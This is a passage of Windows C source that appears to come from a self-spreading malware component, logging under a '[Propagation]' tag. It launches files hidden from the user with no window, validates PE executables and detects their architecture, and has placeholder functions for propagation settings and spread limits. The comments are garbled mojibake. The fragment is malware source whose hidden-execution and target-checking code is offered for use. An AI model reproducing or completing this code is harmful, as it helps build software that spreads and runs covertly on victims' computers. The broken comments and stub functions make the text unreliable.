    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (!CreateProcessW(file_path, NULL, NULL, NULL, FALSE, 
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[Propagation] Failed to execute file: %d\n", GetLastError());
        return FALSE;
    }
    
    // �����رվ�������ȴ����̽���
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return TRUE;
}

// ���PE�ļ���Ч��
BOOL is_valid_pe_file(const WCHAR* file_path) {
    HANDLE hFile = CreateFileW(file_path, GENERIC_READ, FILE_SHARE_READ, 
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    IMAGE_DOS_HEADER dos_header;
    DWORD bytes_read;
    
    if (!ReadFile(hFile, &dos_header, sizeof(dos_header), &bytes_read, NULL) ||
        bytes_read != sizeof(dos_header)) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    if (dos_header.e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    // ���NTͷ
    SetFilePointer(hFile, dos_header.e_lfanew, NULL, FILE_BEGIN);
    IMAGE_NT_HEADERS nt_headers;
    
    if (!ReadFile(hFile, &nt_headers, sizeof(nt_headers), &bytes_read, NULL) ||
        bytes_read != sizeof(nt_headers)) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    CloseHandle(hFile);
    
    return (nt_headers.Signature == IMAGE_NT_SIGNATURE);
}

// ��ȡPE�ļ��ܹ�
BOOL get_pe_architecture(const WCHAR* file_path, BOOL* is_64bit) {
    HANDLE hFile = CreateFileW(file_path, GENERIC_READ, FILE_SHARE_READ, 
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    IMAGE_DOS_HEADER dos_header;
    DWORD bytes_read;
    
    if (!ReadFile(hFile, &dos_header, sizeof(dos_header), &bytes_read, NULL)) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    SetFilePointer(hFile, dos_header.e_lfanew, NULL, FILE_BEGIN);
    IMAGE_NT_HEADERS nt_headers;
    
    if (!ReadFile(hFile, &nt_headers, sizeof(nt_headers), &bytes_read, NULL)) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    CloseHandle(hFile);
    
    *is_64bit = (nt_headers.FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64);
    return TRUE;
}

// ���ش�������
BOOL load_propagation_config() {
    // ��ע���������ļ���������
    // ����ʹ��Ĭ������
    printf("[Propagation] Using default propagation configuration\n");
    return TRUE;
}

// ���ô�������
void set_propagation_limits() {
    // ���ô���Ƶ�ʺ�Ŀ����������
    printf("[Propagation] Propagation limits set\n");
}
